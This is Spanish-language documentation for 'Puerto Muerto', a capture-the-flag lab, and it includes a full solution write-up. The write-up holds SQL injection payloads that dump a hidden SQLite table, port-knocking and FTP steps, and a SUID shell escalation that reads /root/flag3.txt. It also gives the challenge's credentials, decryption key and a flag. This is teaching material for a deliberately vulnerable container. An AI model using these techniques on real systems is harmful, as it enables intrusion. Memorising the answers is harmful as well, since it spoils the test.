# Puerto Muerto — Documentación del Reto

## Descripción General

Durante una auditoría de seguridad rutinaria, el equipo de respuesta a incidentes
ha localizado un servidor de gestión portuaria que lleva años operando sin supervisión.
El servidor pertenecía a la infraestructura legacy del **Puerto Muerto**, una instalación
portuaria que fue dada de baja oficialmente en 2021.

Inexplicablemente, el servidor sigue encendido y respondiendo. Nadie del equipo actual
de IT recuerda haberlo configurado, y la documentación técnica original se perdió
durante la reestructuración de la empresa.

Tu misión es conectarte a este servidor, reconstruir su estructura de acceso
y recuperar las tres evidencias digitales clasificadas que permanecen almacenadas
en sus sistemas. Cuando todas las evidencias estén en tu poder, el sistema de
verificación certificará el éxito total de la operación.

---

## Objetivo

Recuperar las tres flags ocultas en el sistema y enviarlas al portal de verificación.
Una vez verificadas las tres, el portal revelará la **clave maestra de operación**,
que constituye la solución final del reto.

---

## Punto de Entrada

Se te proporciona únicamente la dirección IP del servidor y un puerto de acceso inicial.

```
IP:              <dirección IP del servidor>
Puerto inicial:  <PORTOUT>
```

El resto de la infraestructura deberás descubrirlo tú mismo.

---

## Portal de Verificación

El portal de entrega de flags está disponible en:

```
http://<dirección IP>:<PORTAL_PORT>
```

Puedes enviar las flags en cualquier orden y en cualquier momento.
El portal registra el estado de cada envío dentro de tu sesión activa.

---

## Flags

El reto contiene **tres flags** y una **clave maestra**:

| Identificador | Descripción                         | Formato                     |
|---------------|-------------------------------------|-----------------------------|
| Evidencia #1  | Acceso al módulo de inspección      | `G3CUBO{...}`               |
| Evidencia #2  | Acceso al módulo de mantenimiento   | `G3CUBO{...}`               |
| Evidencia #3  | Control total del sistema           | `G3CUBO{...}`               |
| Clave Maestra | Revelada al entregar las tres flags | `G3CUBO{puerto_muerto_...}` |

---

## Normas del Reto

- Está permitido el uso de cualquier herramienta estándar de auditoría.
- No está permitido modificar ni eliminar flags ajenas.
- No está permitido interrumpir el servicio de forma deliberada para otros participantes.
- El servidor está diseñado para ser comprometido de forma controlada dentro
  del entorno Docker. No se deben realizar acciones destructivas sobre el sistema
  de ficheros del contenedor.
- Toda la información necesaria para resolver el reto se encuentra dentro
  del propio servidor. No se requieren recursos externos.

---

## Servicios Identificados

A continuación se indica la información que el equipo de auditoría ha podido
confirmar antes de tu intervención:

- Se ha detectado **al menos un servicio activo** en el puerto de entrada proporcionado.
- Pueden existir servicios adicionales que no sean visibles en el escaneo inicial.
- Se sabe que el sistema utiliza algún tipo de **mecanismo de control de acceso**
  que restringe la visibilidad de ciertos puertos.

---

## Herramientas Recomendadas

No es obligatorio utilizar ninguna herramienta en concreto. Las siguientes son
sugerencias basadas en las técnicas que cubre el reto:

| Herramienta             | Uso sugerido                                                              |
|-------------------------|---------------------------------------------------------------------------|
| `nmap`                  | Enumeración de puertos y servicios                                        |
| `ftp`                   | Acceso al servicio de transferencia de ficheros y consulta de metadatos   |
| `knock`                 | Activación de mecanismos de acceso ocultos                                |
| `base64` / `xxd`        | Decodificación de credenciales ofuscadas                                  |
| `curl` / navegador      | Interacción con la aplicación web e inspección de respuestas HTTP         |
| `openssl` / `sha256sum` | Operaciones criptográficas, derivación de claves y descifrado de ficheros |
| `ssh`                   | Acceso remoto al servidor de mantenimiento                                |
| `find`                  | Enumeración del sistema de ficheros local                                 |

---

## Sistema de Pistas

<details>
<summary>Pista 1 — Primer contacto</summary>

El servidor tiene un servicio de transferencia de ficheros accesible de forma anónima.
Examina con atención **todos** los ficheros disponibles, incluyendo su contenido completo.
Puede haber más de un fichero relevante.

</details>

<details>
<summary>Pista 2 — Acceso bloqueado</summary>

Algunos puertos no son visibles hasta que se realiza una acción específica.
Los sistemas legacy a veces utilizan secuencias de activación para proteger
el acceso a módulos sensibles. Los códigos de activación pueden estar
documentados en los propios recursos del servidor.

</details>

<details>
<summary>Pista 3 — El portal interno</summary>

Tras activar los módulos, encontrarás una aplicación web de gestión portuaria.
El acceso requiere credenciales. Esas credenciales no se encuentran en el portal
en sí — fueron exportadas previamente en un formato que requiere más de un paso
para recuperarlas. Inspecciona el código fuente de las páginas con atención.

</details>

<details>
<summary>Pista 4 — La clave del mantenimiento</summary>

La clave de acceso SSH está protegida por una passphrase.
Esa passphrase fue derivada de información disponible en el propio servidor FTP.
El protocolo FTP dispone de comandos que permiten consultar metadatos de ficheros,
como la fecha y hora de su última modificación.

</details>

<details>
<summary>Pista 4b — La evidencia cifrada</summary>

Una vez dentro del sistema como usuario de mantenimiento, comprobarás que la
evidencia del módulo no está en texto plano. El fichero está cifrado con AES-256-CBC.

La clave de descifrado sigue el mismo patrón que la passphrase SSH: SHA256 de un
metadato del servidor FTP. Pero no es el mismo metadato ni el mismo comando.
El protocolo FTP expone más de una propiedad de un fichero de forma nativa.

El panel interno del sistema contiene una nota de aviso que puede orientarte.

</details>

<details>
<summary>Pista 5 — Escalada de privilegios</summary>

Una vez dentro del sistema, busca binarios con permisos inusuales.
Algunos programas del sistema no especifican la ruta absoluta de las herramientas
que invocan, lo que puede ser aprovechado por quien controla el entorno de ejecución.

</details>

---

## Write-up

<details>
<summary>SOLUCION COMPLETA — Solo desplegar tras haber resuelto el reto</summary>

### Fase 1 — Enumeración inicial y FTP anónimo

```bash
nmap -sV -p- <IP>
```

El escaneo revela el puerto FTP abierto (2121). Los puertos 8090 y 2222
aparecen filtrados. Conexión anónima al FTP:

```bash
ftp <IP> 2121
```

Descarga de todos los ficheros disponibles:

```
ftp> get README.txt
ftp> get inspector_registry.txt
ftp> cd private
ftp> get maintenance.key
```

README.txt contiene tres códigos de activación: 1006, 2175, 7331.
inspector_registry.txt contiene un payload codificado en dos capas.

### Fase 2 — Decodificación de credenciales

El fichero inspector_registry.txt contiene una línea en base64.
Decodificación en dos pasos:

```bash
# Paso 1: base64 decode produce una cadena hexadecimal
echo "PAYLOAD_BASE64" | base64 -d

# Paso 2: hex decode produce el texto plano
echo "PAYLOAD_BASE64" | base64 -d | xxd -r -p
# Resultado: PM-007:Mu3lle#Norte19
```

### Fase 3 — Port knocking

```bash
knock <IP> 1006 2175 7331
```

Esto desbloquea los puertos 8090 (HTTP) y 2222 (SSH) para la IP origen.

### Fase 4 — Flag 1: SIGEPORT SQLi

Acceso al portal web:

```
http://<IP>:8090
```

Se presenta el portal SIGEPORT con formulario de login. Las credenciales
recuperadas del FTP permiten el acceso legítimo:

```
ID de Inspector: PM-007
Código de Acceso: Mu3lle#Norte19
```

Una vez dentro, el panel muestra una tabla de manifiestos con una barra de búsqueda.
Inspeccionando el código fuente de la página (Ctrl+U) se encuentra un comentario HTML
en el bloque `<head>` con referencias al subsistema de mantenimiento y al usuario SSH.

La barra de búsqueda es vulnerable a inyección SQL. Confirmación del número de columnas:

```
' ORDER BY 4--
```

Enumeración del esquema de la base de datos:

```
' UNION SELECT name,sql,NULL,NULL FROM sqlite_master WHERE type='table'--
```

Se descubre la tabla classified_cargo, no visible en la interfaz.
Extracción de la flag:

```
' UNION SELECT manifest_ref,cargo_type,clearance,NULL FROM classified_cargo--
```

La columna clearance contiene la Flag 1.

### Fase 5 — Derivación de passphrase SSH y acceso como porter

Obtención del timestamp MDTM del fichero README.txt en el FTP:

```bash
ftp <IP> 2121
ftp> quote MDTM README.txt
# 213 YYYYMMDDHHmmss
```

Derivación de la passphrase:

```bash
echo -n "YYYYMMDDHHmmss" | sha256sum | awk '{print $1}'
```

Conexión SSH con la clave descargada:

```bash
ssh -i maintenance.key -p 2222 porter@<IP>
# Passphrase: hash derivado del MDTM
```

### Fase 6 — Flag 2

Una vez autenticado como porter, el directorio home no contiene flag2.txt
sino un fichero cifrado:

```bash
ls -la ~
# -rw-r----- 1 porter porter  96 ... flag2.enc
```

El panel SIGEPORT incluye una nota de aviso en la sección de manifiestos indicando
que los archivos del módulo de mantenimiento están cifrados con AES-256 y que la
clave se deriva de metadatos del repositorio FTP mediante el mismo protocolo de
derivación aplicado a las credenciales SSH.

Se reconecta al servidor FTP y se usa el comando SIZE para obtener el tamaño
exacto en bytes del fichero README.txt — un metadato distinto al timestamp MDTM
ya utilizado en la fase anterior:

```
ftp> quote SIZE README.txt
213 1005
```

Derivación de la clave de descifrado:

```bash
echo -n "1005" | sha256sum | awk '{print $1}'
# → 7f861bcee185de001377d79e08af62e94b1e7718e2470e08520c917f8d953602
```

Descifrado de la evidencia:

```bash
openssl enc -aes-256-cbc -d -pbkdf2 \
    -in ~/flag2.enc \
    -pass pass:7f861bcee185de001377d79e08af62e94b1e7718e2470e08520c917f8d953602
# → G3CUBO{29e490ad5d6178da9d8a400154af884d}
```

### Fase 7 — Escalada de privilegios (porter a root)

El binario /usr/local/bin/port-env tiene el bit SUID activo y es propiedad de root.
Explotación directa via GTFOBins:

```bash
/usr/local/bin/port-env /bin/sh -p -c "cat /root/flag3.txt"
```

La Flag 3 se obtiene directamente con EUID de root.

### Fase 8 — Entrega al portal

Acceder al portal en http://<IP>:<PORTAL_PORT> y enviar las tres flags.
El portal revela la clave maestra de operación al verificar las tres correctamente.

</details>

---

## Información Técnica del Entorno

| Componente         | Detalle                                                                                                                    |
|--------------------|----------------------------------------------------------------------------------------------------------------------------|
| Sistema operativo  | Debian Bookworm (slim)                                                                                                     |
| Contenedor         | Docker — imagen única multi-servicio                                                                                       |
| Servicios activos  | FTP (vsftpd), HTTP (Flask/SIGEPORT), SSH (OpenSSH), knockd, cron                                                          |
| Portal de flags    | Flask + Gunicorn (puerto 3000)                                                                                             |
| Dificultad         | Media-Alta                                                                                                                 |
| Técnicas cubiertas | Port knocking, encoding chain, SQLi auth bypass, UNION-based extraction, SSH key cracking, FTP metadata, AES decrypt, SUID GTFOBins |

---

Documento generado para uso interno del equipo docente.
No distribuir a los participantes antes de la finalización del reto.
